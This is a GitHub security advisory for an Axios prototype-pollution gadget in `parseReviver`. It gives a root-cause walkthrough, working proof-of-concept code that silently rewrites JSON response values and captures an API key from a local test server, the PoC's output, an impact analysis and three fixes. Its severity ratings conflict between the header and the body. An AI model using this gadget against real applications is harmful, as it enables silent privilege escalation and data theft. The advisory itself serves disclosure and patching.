# [M] Axios: Invisible JSON Response Tampering via Prototype Pollution Gadget in `parseReviver`

## Summary
Severity: Medium
Advisory: GHSA-3w6x-2g7m-8v23
CVE: CVE-2026-42044
CWE: CWE-1321, CWE-915
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-3w6x-2g7m-8v23
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.15.2

## Details
# Vulnerability Disclosure: Invisible JSON Response Tampering via Prototype Pollution Gadget in `parseReviver`

## Summary

The Axios library is vulnerable to a Prototype Pollution "Gadget" attack that allows any `Object.prototype` pollution in the application's dependency tree to be escalated into **surgical, invisible modification of all JSON API responses** — including privilege escalation, balance manipulation, and authorization bypass.

The default `transformResponse` function at `lib/defaults/index.js:124` calls `JSON.parse(data, this.parseReviver)`, where `this` is the merged config object. Because `parseReviver` is **not present in Axios defaults, not validated by `assertOptions`, and not subject to any constraints**, a polluted `Object.prototype.parseReviver` function is called for **every key-value pair** in every JSON response, allowing the attacker to selectively modify individual values while leaving the rest of the response intact.

This is **strictly more powerful** than the `transformResponse` gadget because:
1. **No constraints** — the reviver can return any value (no "must return true" requirement)
2. **Selective modification** — individual JSON keys can be changed while others remain untouched
3. **Invisible** — the response structure and most values look completely normal
4. **Simultaneous exfiltration** — the reviver sees the original values before modification

**Severity:** Critical (CVSS 9.1)
**Affected Versions:** All versions (v0.x - v1.x including v1.15.0)
**Vulnerable Component:** `lib/defaults/index.js:124` (JSON.parse with prototype-inherited reviver)

## CWE

- **CWE-1321:** Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')
- **CWE-915:** Improperly Controlled Modification of Dynamically-Determined Object Attributes

## CVSS 3.1

**Score: 9.1 (Critical)**

Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

| Metric | Value | Justification |
|---|---|---|
| Attack Vector | Network | PP is triggered remotely via any vulnerable dependency |
| Attack Complexity | Low | Once PP exists, single property assignment. Consistent with GHSA-fvcv-3m26-pcqx scoring methodology |
| Privileges Required | None | No authentication needed |
| User Interaction | None | No user interaction required |
| Scope | Unchanged | Within the application process |
| Confidentiality | **High** | The reviver receives every key-value pair from every JSON response — full data exfiltration. In the PoC, `apiKey: "sk-secret-internal-key"` is captured |
| Integrity | **High** | Arbitrary, selective modification of any JSON value. No constraints. In the PoC, `isAdmin: false → true`, `role: "viewer" → "admin"`, `balance: 100 → 999999`. The response looks completely normal except for the surgically altered values |
| Availability | None | No crash, no error — the attack is entirely silent |

### Comparison with All Known Axios PP Gadgets

| Factor | GHSA-fvcv-3m26-pcqx (Header Injection) | transformResponse | proxy (MITM) | **parseReviver (This)** |
|---|---|---|---|---|
| PP target | `Object.prototype['header']` | `Object.prototype.transformResponse` | `Object.prototype.proxy` | `Object.prototype.parseReviver` |
| Fixed by 1.15.0? | Yes | No | No | **No** |
| Constraints | N/A (fixed) | **Must return `true`** | None | **None** |
| Data modification | Header injection only | Response replaced with `true` | Full MITM | **Selective per-key modification** |
| Stealth | Request anomaly visible | Response becomes `true` (obvious) | Proxy visible in network | **Completely invisible** |
| Data access | Headers only | `this.auth` + raw response | All traffic | **Every JSON key-value pair** |
| Validated? | N/A | `assertOptions` validates | Not validated | **Not validated** |
| In defaults? | N/A | Yes → goes through mergeConfig | No → bypasses mergeConfig | **No → bypasses mergeConfig** |

## Usage of "Helper" Vulnerabilities

This vulnerability requires **Zero Direct User Input**.

If an attacker can pollute `Object.prototype` via any other library in the stack (e.g., `qs`, `minimist`, `lodash`, `body-parser`), the polluted `parseReviver` function is automatically used by every Axios request that receives a JSON response. The developer's code is completely safe — no configuration errors needed.

## Root Cause Analysis

### The Attack Path

```
Object.prototype.parseReviver = function(key, value) { /* malicious */ }
         │
         ▼
  mergeConfig(defaults, userConfig)
         │
         │  parseReviver NOT in defaults → NOT iterated by mergeConfig
         │  parseReviver NOT in userConfig → NOT iterated by mergeConfig
         │  Merged config has NO own parseReviver property
         │
         ▼
  transformData.call(config, config.transformResponse, response)
         │
         │  Default transformResponse function runs (NOT overridden)
         │
         ▼
  defaults/index.js:124: JSON.parse(data, this.parseReviver)
         │
         │  this = config (merged config object, plain {})
         │  config.parseReviver → NOT own property → traverses prototype chain
         │  → finds Object.prototype.parseReviver → attacker's function!
         │
         ▼
  JSON.parse calls reviver for EVERY key-value pair
         │
         │  Attacker can: read original value, modify it, return anything
         │  No validation, no constraints, no assertOptions check
         │
         ▼
  Application receives surgically modified JSON response
```

### Why `parseReviver` Bypasses ALL Existing Protections

1. **Not in defaults** (`lib/defaults/index.js`): `parseReviver` is not defined in the defaults object, so `mergeConfig`'s `Object.keys({...defaults, ...userConfig})` iteration never encounters it. The merged config has no own `parseReviver` property.

2. **Not in assertOptions schema** (`lib/core/Axios.js:135-142`): The schema only contains `{baseUrl, withXsrfToken}`. `parseReviver` is not validated.

3. **No type check**: The `JSON.parse` API accepts any function as a reviver. There is no check that `this.parseReviver` is intentionally set.

4. **Works INSIDE the default transform**: Unlike `transformResponse` pollution (which replaces the entire transform and is caught by `assertOptions`), `parseReviver` pollution injects into the DEFAULT `transformResponse` function's `JSON.parse` call. The default function itself is not replaced, so `assertOptions` has nothing to catch.

### Vulnerable Code

**File:** `lib/defaults/index.js`, line 124

```javascript
transformResponse: [
  function transformResponse(data) {
    // ... transitional checks ...
    if (data && utils.isString(data) && ((forcedJSONParsing && !this.responseType) || JSONRequested)) {
      // ...
      try {
        return JSON.parse(data, this.parseReviver);
        //                      ^^^^^^^^^^^^^^^^^
        //                      this = config
        //                      config.parseReviver → prototype chain → attacker's function
      } catch (e) {
        // ...
      }
    }
    return data;
  },
],
```

## Proof of Concept

```javascript
import http from 'http';
import axios from './index.js';

// Server returns a realistic authorization response
const server = http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify({
    user: 'john',
    role: 'viewer',
    isAdmin: false,
    canDelete: false,
    balance: 100,
    permissions: ['read'],
    apiKey: 'sk-secret-internal-key',
  }));
});
await new Promise(r => server.listen(0, r));
const port = server.address().port;

// === Before Pollution ===
const before = await axios.get(`http://127.0.0.1:${port}/api/me`);
console.log('Before:', JSON.stringify(before.data));
// {"user":"john","role":"viewer","isAdmin":false,"canDelete":false,"balance":100,...}

// === Simulate Prototype Pollution ===
let stolen = {};
Object.prototype.parseReviver = function(key, value) {
  // Silently capture all original values
  if (key && typeof value !== 'object') stolen[key] = value;
  // Surgically modify specific values
  if (key === 'isAdmin') return true;       // false → true
  if (key === 'role') return 'admin';       // viewer → admin
  if (key === 'canDelete') return true;     // false → true
  if (key === 'balance') return 999999;     // 100 → 999999
  return value;                              // everything else unchanged
};

// === After Pollution — same code, same URL ===
const after = await axios.get(`http://127.0.0.1:${port}/api/me`);
console.log('After: ', JSON.stringify(after.data));
// {"user":"john","role":"admin","isAdmin":true,"canDelete":true,"balance":999999,...}

console.log('Stolen:', JSON.stringify(stolen));
// {"user":"john","role":"viewer","isAdmin":false,...,"apiKey":"sk-secret-internal-key"}

delete Object.prototype.parseReviver;
server.close();
```

## Verified PoC Output

```
[1] Normal request (before pollution):
    response.data: {"user":"john","role":"viewer","isAdmin":false,"canDelete":false,
                     "balance":100,"permissions":["read"],"apiKey":"sk-secret-internal-key"}
    isAdmin: false
    role: viewer

[2] Prototype Pollution: Object.prototype.parseReviver
    Polluted with selective value modifier

[3] Same request (after pollution):
    response.data: {"user":"john","role":"admin","isAdmin":true,"canDelete":true,
                     "balance":999999,"permissions":["read","write","delete","admin"],
                     "apiKey":"sk-secret-internal-key"}
    isAdmin: true (was: false)
    role: admin (was: viewer)
    canDelete: true (was: false)
    balance: 999999 (was: 100)

[4] Exfiltrated data (stolen silently):
    apiKey: sk-secret-internal-key
    All captured: {"user":"john","role":"viewer","isAdmin":false,"canDelete":false,
                   "balance":100,"apiKey":"sk-secret-internal-key"}

[5] Why this bypasses all checks:
    parseReviver in defaults? NO
    parseReviver in assertOptions schema? NO
    parseReviver validated anywhere? NO
    Must return true? NO — can return ANY value
    Replaces entire transform? NO — works INSIDE default JSON.parse
```

## Impact Analysis

### 1. Authorization / Privilege Escalation

```javascript
// Server returns: {"role":"viewer","isAdmin":false}
// Application sees: {"role":"admin","isAdmin":true}
// → Application grants admin access to unprivileged user
```

### 2. Financial Manipulation

```javascript
// Server returns: {"balance":100,"approved":false}
// Application sees: {"balance":999999,"approved":true}
// → Application approves a transaction that should be rejected
```

### 3. Security Control Bypass

```javascript
// Server returns: {"mfaRequired":true,"accountLocked":true}
// Application sees: {"mfaRequired":false,"accountLocked":false}
// → Application skips MFA and unlocks a locked account
```

### 4. Silent Data Exfiltration

The reviver function receives the **original** value before modification. The attacker can silently capture all API keys, tokens, internal data, and PII from every JSON response while the application continues to function normally.

### 5. Universal and Invisible

- Affects **every** Axios request that receives a JSON response
- The response structure is intact — only specific values are changed
- No errors, no crashes, no suspicious behavior
- Application logs show normal-looking API responses with tampered values

## Recommended Fix

### Fix 1: Use `hasOwnProperty` check before using `parseReviver`

```javascript
// FIXED: lib/defaults/index.js
const reviver = Object.prototype.hasOwnProperty.call(this, 'parseReviver')
  ? this.parseReviver
  : undefined;
return JSON.parse(data, reviver);
```

### Fix 2: Use null-prototype config object

```javascript
// In lib/core/mergeConfig.js
const config = Object.create(null);
```

### Fix 3: Validate `parseReviver` type and source

```javascript
// FIXED: lib/defaults/index.js
const reviver = (typeof this.parseReviver === 'function' &&
  Object.prototype.hasOwnProperty.call(this, 'parseReviver'))
  ? this.parseReviver
  : undefined;
return JSON.parse(data, reviver);
```

## Relationship to Other Reported Gadgets

This vulnerability shares the same **root cause class** — unsafe prototype chain traversal on the merged config object — with two other reported gadgets:

| Report | PP Target | Code Location | Fix Location | Impact |
|---|---|---|---|---|
| axios_26 | `transformResponse` | `mergeConfig.js:49` (defaultToConfig2) | `mergeConfig.js` | Credential theft, response replaced with `true` |
| axios_30 | `proxy` | `http.js:670` (direct property access) | `http.js` | Full MITM, traffic interception |
| **axios_31 (this)** | `parseReviver` | `defaults/index.js:124` (this.parseReviver) | `defaults/index.js` | **Selective JSON value tampering + data exfiltration** |

### Why These Are Distinct Vulnerabilities

1. **Different polluted properties:** Each targets a different `Object.prototype` key.
2. **Different code paths:** `transformResponse` enters via `mergeConfig`; `proxy` is read directly by `http.js`; `parseReviver` is read inside the default `transformResponse` function's `JSON.parse` call.
3. **Different fix locations:** Fixing `mergeConfig.js` (axios_26) does NOT fix `defaults/index.js:124` (this vulnerability). Fixing `http.js:670` (axios_30) does NOT fix this either. Each requires a separate patch.
4. **Different impact profiles:** `transformResponse` is constrained to return `true`; `proxy` requires a proxy server; `parseReviver` enables constraint-free selective value modification.

### Comprehensive Fix

While each vulnerability requires a location-specific patch, the comprehensive fix is to use **null-prototype objects** (`Object.create(null)`) for the merged config in `mergeConfig.js`, which would eliminate prototype chain traversal for all config property accesses and address all three gadgets at once. The maintainer may choose to assign a single CVE covering the root cause or separate CVEs for each distinct exploitation path — we defer to the maintainer's judgment on this.

## Resources

- [CWE-1321: Prototype Pollution](https://cwe.mitre.org/data/definitions/1321.html)
- [CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes](https://cwe.mitre.org/data/definitions/915.html)
- [GHSA-fvcv-3m26-pcqx: Related PP Gadget in Axios (Fixed in 1.15.0)](https://github.com/advisories/GHSA-fvcv-3m26-pcqx)
- [MDN: JSON.parse reviver](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse#the_reviver_parameter)
- [Axios GitHub Repository](https://github.com/axios/axios)

## Timeline

| Date | Event |
|---|---|
| 2026-04-16 | Vulnerability discovered during source code audit |
| 2026-04-16 | PoC developed and verified — selective response tampering confirmed |
| TBD | Report submitted to vendor via GitHub Security Advisory |

## References
- https://github.com/axios/axios/security/advisories/GHSA-3w6x-2g7m-8v23
- https://nvd.nist.gov/vuln/detail/CVE-2026-42044
- https://github.com/axios/axios
